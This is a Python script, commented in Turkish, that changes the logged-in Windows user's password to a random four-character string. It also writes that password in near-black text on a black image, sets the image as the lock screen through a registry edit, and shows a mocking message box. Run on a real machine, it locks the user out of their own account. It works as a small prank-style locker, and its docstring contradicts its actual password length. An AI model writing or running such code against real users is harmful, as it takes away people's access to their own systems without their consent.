from PIL import Image, ImageDraw, ImageFont
import os
import platform
import ctypes
import random
import string
import subprocess

def generate_random_password(length=4):
    """
    Rastgele bir parola oluşturur.
    - length: Parolanın uzunluğu (varsayılan: 16 karakter).
    """
    if length < 4:
        raise ValueError("Parola uzunluğu en az 4 olmalıdır (büyük harf, küçük harf, rakam ve özel karakter için).")

    # Parola için karakter havuzları
    lower = string.ascii_lowercase  # Küçük harfler
    upper = string.ascii_uppercase  # Büyük harfler
    digits = string.digits          # Rakamlar

    # Her gruptan en az bir karakter seç
    password = [
        random.choice(lower),
        random.choice(upper),
        random.choice(digits),
    ]

    # Geri kalan karakterleri rastgele seç
    all_characters = lower + upper + digits
    password += random.choices(all_characters, k=length - 1)

    # Parolayı karıştır
    random.shuffle(password)

    # Parolayı birleştir ve döndür
    return ''.join(password)

def create_hidden_text_image(output_path, text, image_size=(1920, 1080), text_color=(1, 1, 1)):
    """
    Siyah bir arka planda yazıyı gizler.
    - output_path: Çıktı dosyasının yolu.
    - text: Gizlenecek yazı.
    - image_size: Görüntü boyutu (genişlik, yükseklik).
    - text_color: Yazının rengi (çok koyu gri tonları önerilir).
    """
    # Siyah bir arka plan oluştur
    image = Image.new("RGB", image_size, (0, 0, 0))
    draw = ImageDraw.Draw(image)

    # Yazı tipi ve boyutunu ayarla
    if platform.system() == "Windows":
        font_path = "C:/Windows/Fonts/arial.ttf"  # Windows için Arial fontu
    elif platform.system() == "Darwin":  # macOS
        font_path = "/System/Library/Fonts/Supplemental/Arial.ttf"
    else:  # Linux
        font_path = "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf"  # Linux için alternatif font

    # Yazı tipi dosyasının varlığını kontrol et
    if not os.path.exists(font_path):
        raise FileNotFoundError(f"Font dosyası bulunamadı: {font_path}")

    font = ImageFont.truetype(font_path, 100)

    # Yazıyı merkeze yerleştirmek için boyutunu hesapla
    text_bbox = draw.textbbox((0, 0), text, font=font)  # Yazının sınırlarını al
    text_width = text_bbox[2] - text_bbox[0]
    text_height = text_bbox[3] - text_bbox[1]
    text_x = (image_size[0] - text_width) // 2
    text_y = (image_size[1] - text_height) // 2

    # Yazıyı çiz (çok koyu gri tonlarında)
    draw.text((text_x, text_y), text, font=font, fill=text_color)

    # Görüntüyü kaydet
    image.save(output_path, "PNG")

def set_lock_screen_background(image_path):
    """
    Windows kilit ekranı arka planını değiştirir.
    - image_path: Yeni arka plan görüntüsünün yolu.
    """
    if platform.system() != "Windows":
        raise NotImplementedError("Bu özellik yalnızca Windows'ta desteklenir.")

    # Kilit ekranı arka planını değiştirmek için kayıt defteri ayarlarını yap
    key = r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP"
    command = f'reg add "{key}" /v LockScreenImagePath /t REG_SZ /d "{image_path}" /f'
    subprocess.run(command, shell=True, check=True)

def change_user_password(new_password):
    """
    Kullanıcı parolasını değiştirir.
    - new_password: Yeni parola.
    """
    if platform.system() != "Windows":
        raise NotImplementedError("Bu özellik yalnızca Windows'ta desteklenir.")

    # Kullanıcı parolasını değiştirmek için komut çalıştır
    username = os.getlogin()
    command = f'net user "{username}" "{new_password}"'
    subprocess.run(command, shell=True, check=True)

def show_message_box(message, title="Bilgilendirme"):
    """
    Kullanıcıya bir mesaj kutusu gösterir.
    - message: Gösterilecek mesaj.
    - title: Mesaj kutusunun başlığı.
    """
    ctypes.windll.user32.MessageBoxW(0, message, title, 0x40 | 0x1)

# Kullanım
output_image_path = "hidden_text.png"
random_password = generate_random_password(4)  # Rastgele bir parola oluştur

# Gizli metin içeren görüntüyü oluştur
create_hidden_text_image(output_image_path, f"Parola: {random_password}", text_color=(1, 1, 1))

# Kilit ekranı arka planını değiştir
set_lock_screen_background(os.path.abspath(output_image_path))

# Kullanıcı parolasını değiştir
change_user_password(random_password)

# Kullanıcıya bilgi mesajı göster
show_message_box(
    "Parola için arka plana bak. Unutma, şifreler hiçbir zaman parlak değildir.",
    "Parola Bilgisi"
)
